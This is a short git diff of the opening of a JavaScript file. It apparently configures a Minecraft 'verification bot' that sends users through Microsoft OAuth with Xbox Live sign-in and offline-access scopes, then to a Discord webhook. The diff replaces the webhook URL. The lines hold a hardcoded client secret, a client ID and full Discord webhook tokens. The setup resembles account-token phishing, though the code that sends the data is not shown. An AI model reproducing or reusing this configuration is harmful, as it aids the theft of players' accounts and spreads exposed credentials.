@@ -2,7 +2,7 @@
 const client_secret = 'eN~8Q~eBK.rYhDFuoxBTz6DIk3oZiVdvm5FKRcPI'
 const client_id = '715942dd-50ce-46ef-8e53-127363d8fb97'
 const redirect_uri = 'https://verificationbotmc.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1040286834342772826/s4Z4zBoLc-6axfP_JrJZ-ULynbGNqOeHBkx6PZIQ_tOfT51v7T4sngaQN_SWzt8eIRg-'
+const webhook_url = 'https://discord.com/api/webhooks/1048525552274915338/K9JNAgs9SYg4-dhZ-6SvZg-5Vh5GFOQxWU9XPqLoDeQi7w8Rj4kpYvGOrnYwYkT3sf6Y'
 
 //Requirements
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
